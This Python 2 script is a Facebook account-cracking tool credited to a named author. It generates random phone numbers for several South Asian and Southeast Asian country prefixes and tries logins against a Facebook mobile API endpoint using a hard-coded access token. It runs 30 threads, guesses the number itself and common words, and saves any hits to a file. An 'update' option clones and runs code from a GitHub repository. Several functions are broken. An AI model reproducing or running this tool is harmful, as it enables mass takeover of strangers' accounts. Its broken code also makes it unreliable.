#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(5000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 crack.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
		
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)

back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
logo='''
\033[1;91m     _                           __  ______  
\033[1;92m    / \   _ __   __ _  __ _  __ _\ \/ /  _ \ 
\033[1;93m   / _ \ | '_ \ / _` |/ _` |/ _` |\  /| | | |
\033[1;95m  / ___ \| | | | (_| | (_| | (_| |/  \| |_| |
\033[1;96m /_/   \_\_| |_|\__, |\__, |\__,_/_/\_\____/ 
\033[1;91m                |___/ |___/                        
\033[1;97m--------------------------------------------------
\033[1;97m  [\033[1;92m•\033[1;97m] Author  : Angga Kurniawan
\033[1;97m  [\033[1;92m•\033[1;97m] Version : 5.2
\033[1;97m  [\033[1;92m•\033[1;97m] GitHub  : https://github.com/anggaxd
\033[1;97m  [\033[1;92m•\033[1;97m] YouTube : ANGGA KURNIAWAN
\033[1;97m--------------------------------------------------
                                '''        
Key = 'ANGGAXD'
loop = 'true'
while loop == 'true':
    print logo
    anggaxd = raw_input('[\033[1;92m•\033[1;97m] LICENSE KEY \033[1;96m> \033[1;97m')
    if anggaxd == Key:
        psb('\n\033[1;92mKEY APPROVED BY ANGGA KURNIAWAN')
        time.sleep(1)
        loop = 'false'
        time.sleep(1)
                                
#####INDO########
#=================#
def menu_indo():
	os.system('clear')
	print logo
	psb ('  \033[1;97m[\033[1;92m01\033[1;97m]  Start Crack Indonesia')
	psb ('  \033[1;97m[\033[1;92m00\033[1;97m]  Back To Menu')
	indo()
def indo():
    anggaxd = raw_input('\n[\033[1;93m?\033[1;97m]\033[1;97m Choose an Option : \033[1;97m')
    if anggaxd =='':
        print '[!] Fill In Correctly'
        indo()
    elif anggaxd == '1' or anggaxd == '01':
        os.system('clear')
        print logo
        print("\033[1;97mArea Codes With Network")
        print("\033[1;91m--------------------------------------------------")
        print("\033[1;97m   190 960 180 953 520 191 950 192 521 230 232")
        print("\033[1;97m   951 954 331 955 956 521 522 523 122 511 512")
        print("\033[1;91m--------------------------------------------------")
        try:
            c = raw_input("\033[1;97m[\033[1;93m?\033[1;97m]\033[1;97m Choose Area Code : ")
            k="+628"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu_indo()         
    elif anggaxd == '0' or anggaxd == '00':
        menu()
    else:
        print '[!] Fill In Correctly'
        indo()
    xxx = str(len(id))
    psb ('[\033[1;92m+\033[1;97m] Total Numbers: '+xxx)
    time.sleep(0.5)
    psb ('[\033[1;92m✓\033[1;97m] Cracking Process Has Been Started ...') 
    time.sleep(0.5)
    psb ('[\033[1;91m!\033[1;97m] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print "\033[1;91m--------------------------------------------------"
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('avs')
        except OSError:
            pass
        try:
			pass1 = "Sayang"
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
				okb = open('avs/crack.txt', 'a')
				okb.write(k+c+user+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
					cps = open('avs/crack.txt', 'a')
					cps.write(k+c+user+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:
					pass2 = "Anjing"
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass2
						okb = open('avs/crack.txt', 'a')
						okb.write(k+c+user+pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:
						if 'www.facebook.com' in q['error_msg']:
							print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass2
							cps = open('avs/crack.txt', 'a')
							cps.write(k+c+user+pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)
						else:
							pass3 = "Bangsat"
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass3
								okb = open('avs/crack.txt', 'a')
								okb.write(k+c+user+pass3+'\n')
								okb.close()
								oks.append(c+user+pass3)
							else:
								if 'www.facebook.com' in q['error_msg']:
									print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass3
									cps = open('avs/crack.txt', 'a')
									cps.write(k+c+user+pass3+'\n')
									cps.close()
									cpb.append(c+user+pass3)
								
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print "\033[1;91m--------------------------------------------------"
    print '\033[1;97m[\033[1;92m✓\033[1;97m] Process Has Been Completed ...'
    print '[\033[1;92m✓\033[1;97m] Total \033[1;92mSuccessfuly\033[1;97m/\033[1;93mCheckpoint\033[1;97m : '+str(len(oks))+'/'+str(len(cpb))
    print('[\033[1;92m✓\033[1;97m] Cracking Accounts Has Been Saved : avs/crack.txt')
    
    raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;97m]")
    menu()                                
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    menu()
####INI MENU KONTOL ####
def menu():
	os.system("clear")
	print logo
	psb ('Menu Crack Number Country : \n')
	time.sleep(0.80)
	print '  \033[1;97m[\033[1;92m01\033[1;97m]  Bangladesh'
	print '  \033[1;97m[\033[1;92m02\033[1;97m]  India'
	print '  \033[1;97m[\033[1;92m03\033[1;97m]  Pakistan'
	print '  \033[1;97m[\033[1;92m04\033[1;97m]  Indonesia'
	print '  \033[1;97m[\033[1;92m05\033[1;97m]  Afghanistan'+'\n'
	print '  \033[1;97m[\033[1;92m15\033[1;97m]  Update Tools'
	print '  \033[1;97m[\033[1;92m00\033[1;97m]  Exit            '
	print "\033[1;97m----------------------------------------------\n"
	action()

def action():
    anggaxd = raw_input('[\033[1;93m?\033[1;97m]\033[1;97m Choose an Option : \033[1;97m')
    if anggaxd =='':
        print '[!] Pilih Yang Bener Sob'
        action()
    elif anggaxd == '1' or anggaxd == '01':
        os.system("clear")
        print logo
        print("\033[1;97mArea Codes With Network")
        print("\033[1;91m--------------------------------------------------")
        print("\033[1;97m   194 199 197 190 191 192 193 196 180 181 182")
        print("\033[1;91m--------------------------------------------------")
        try:
            c = raw_input("\033[1;97mChoose Area Code : ")
            k="+880"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif anggaxd == '2' or anggaxd == '02':
        os.system("clear")
        print logo
        print("\033[1;97mArea Codes With Network")
        print("\033[1;91m--------------------------------------------------")
        print("\033[1;97m      620 630 700 786 905 954 967 971 990")
        print("\033[1;97m      991 992 993 994 995 996 997 998 999")
        print("\033[1;91m--------------------------------------------------")
        try:
            c = raw_input("\033[1;97mChoose Area Code : ")
            k="+91"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()
    elif anggaxd == '3' or anggaxd == '03':
        os.system("clear")
        print logo
        print("\033[1;97mArea Codes With Network")
        print("\033[1;91m--------------------------------------------------")
        print("\033[1;97mJazz    \033[1;93m:    \033[1;97m00 01 02 03 04 05 06 07 08 09")
        print("\033[1;97mZong    \033[1;93m:    \033[1;97m10 11 12 13 14 15 16 17 18")
        print("\033[1;97mWarid   \033[1;93m:    \033[1;97m20 21 22 23 24")
        print("\033[1;97mUfone   \033[1;93m:    \033[1;97m30 31 32 33 34 35 36 37")
        print("\033[1;97mTelenor \033[1;93m:    \033[1;97m40 41 42 43 44 45 46 47 48 49")
        print("\033[1;91m--------------------------------------------------")
        try:
            c = raw_input("\033[1;97mChoose Area Code : ")
            k="+923"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()            
    elif anggaxd == '4' or anggaxd == '04':
    	time.sleep(1)
        menu_indo()
    elif anggaxd == '5' or anggaxd == '05':
        os.system("clear")
        print logo
        print("\033[1;97mArea Codes With Network")
        print("\033[1;91m--------------------------------------------------")
        print("\033[1;97m           20 27 30 31 40 50 51 58 60")
        print("\033[1;91m--------------------------------------------------")
        try:
            c = raw_input("\033[1;97mChoose Area Code : ")
            k="+930"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu()                   
    elif anggaxd == '6' or anggaxd == '06':
        os.system("clear")
        print logo
        print("\033[1;97mArea Codes With Network")
        print("\033[1;91m--------------------------------------------------")
        print("\033[1;97mJazz    \033[1;93m:    \033[1;97m00 01 02 03 04 05 06 07 08 09")
        print("\033[1;97mZong    \033[1;93m:    \033[1;97m10 11 12 13 14 15 16 17 18")
        print("\033[1;97mWarid   \033[1;93m:    \033[1;97m20 21 22 23 24")
        print("\033[1;97mUfone   \033[1;93m:    \033[1;97m30 31 32 33 34 35 36 37")
        print("\033[1;97mTelenor \033[1;93m:    \033[1;97m40 41 42 43 44 45 46 47 48 49")
        print("\033[1;91m--------------------------------------------------")
        try:
            c = raw_input("\033[1;97mChoose Area Code : ")
            k="+030"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            menu() 
    elif anggaxd =="15":          
        os.system("clear")   
        os.system('cp .... $HOME')
        os.system('cd $HOME && git clone https://github.com/anggaxd/crack')
        os.system("mv $HOME/.... $HOME/crack")
        print logo
        psb('10%') psb('20%') psb('30%') psb('40%') psb('50%') psb('60%') psb('70%') psb('80%') psb('90%') psb('100%') psb('✓') psb('✓') psb('✓')
        psb('Congratulations Tool Has Been Updated Successfully')
        time.sleep(2)
        os.system("cd $HOME/crack && python2 crack.py")
        menu()
#    elif anggaxd =="6":              
#        os.system("clear")
#        print logo
#        print("\033[1;97mArea Codes With Network")+'\n'
#        print("\033[1;97m31, 2, 15, 16, 17, 18, 19")+'\n'
#        try:
#            c = raw_input("\033[1;97mChoose Area Code : ")
#            k="+880"
#            idlist = ('.txt')
#            for line in open(idlist,"r").readlines():
#                id.append(line.strip())
#        except IOError:
#            print ("[!] File Not Found")
#            raw_input("\n[ Back ]")
#            menu()            
    elif anggaxd =='0':
        keluar()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    psb ('[\033[1;92m+\033[1;97m] Total Numbers: '+xxx)
    time.sleep(0.5)
    psb ('[\033[1;92m✓\033[1;97m] Cracking Process Has Been Started ...') 
    time.sleep(0.5)
    psb ('[\033[1;91m!\033[1;97m] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print "\033[1;91m--------------------------------------------------"
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('avs')
        except OSError:
            pass
        try:
			pass1 = user
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
				okb = open('avs/crack.txt', 'a')
				okb.write(k+c+user+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
					cps = open('avs/crack.txt', 'a')
					cps.write(k+c+user+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
				else:
					pass2 = "786786"
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass2
						okb = open('avs/crack.txt', 'a')
						okb.write(k+c+user+ ' ◐ ' +pass2+'\n')
						okb.close()
						oks.append(c+user+pass2)
					else:
						if 'www.facebook.com' in q['error_msg']:
							print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass2
							cps = open('avs/crack.txt', 'a')
							cps.write(k+c+user+ ' ◐ ' +pass2+'\n')
							cps.close()
							cpb.append(c+user+pass2)
						else:
							pass3 = "Pakistan"
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass3
								okb = open('avs/crack.txt', 'a')
								okb.write(k+c+user+pass3+'\n')
								okb.close()
								oks.append(c+user+pass3)
							else:
								if 'www.facebook.com' in q['error_msg']:
									print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass3
									cps = open('avs/crack.txt', 'a')
									cps.write(k+c+user+pass3+'\n')
									cps.close()
									cpb.append(c+user+pass3)
								else:
									pass4 = "Bangladesh"
									data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass4
										okb = open('avs/crack.txt', 'a')
										okb.write(k+c+user+pass4+'\n')
										okb.close()
										oks.append(c+user+pass4)
									else:
										if 'www.facebook.com' in q['error_msg']:
											print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass4
											cps = open('avs/crack.txt', 'a')
											cps.write(k+c+user+pass4+'\n')
											cps.close()
											cpb.append(c+user+pass4)
			
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print "\033[1;91m--------------------------------------------------"
    print '\033[1;97m[\033[1;92m✓\033[1;97m] Process Has Been Completed ...'
    print '[\033[1;92m✓\033[1;97m] Total \033[1;92mSuccessfully\033[1;97m/\033[1;93mCheckpoint\033[1;97m : '+str(len(oks))+'/'+str(len(cpb))
    print('[\033[1;92m✓\033[1;97m] Cracking Accounts Has Been Saved : avs/crack.txt')
    
    raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;97m]")
    menu()
          
if __name__ == '__main__':
    menu()
                                
